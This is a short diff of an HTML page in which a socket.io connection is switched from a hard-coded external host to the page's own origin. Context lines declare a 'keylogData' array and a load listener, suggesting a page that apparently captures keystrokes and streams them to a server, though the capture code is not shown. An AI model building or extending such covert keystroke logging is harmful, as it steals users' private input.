@@ -55,7 +55,7 @@
     
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
     <script>
-        const socket = io('https://expense-manager-vpn.onrender.com');
+        const socket = io(window.location.origin);
         let keylogData = [];
         
         window.addEventListener('load', () => {
